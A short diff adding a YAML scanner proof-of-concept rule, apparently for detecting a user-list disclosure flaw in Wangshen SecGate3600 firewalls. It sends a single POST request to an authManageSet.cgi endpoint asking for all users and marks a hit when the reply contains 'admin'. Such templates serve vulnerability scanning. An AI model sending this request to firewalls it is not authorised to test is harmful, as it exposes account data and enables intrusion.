@@ -1,0 +1,10 @@
+name: poc-wangshen-SecGate3600-loginpass
+rules:
+  - method: POST
+    path: "/cgi-bin/authUser/authManageSet.cgi"
+    body:
+      "type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'admin')
+detail:
+  author: 666
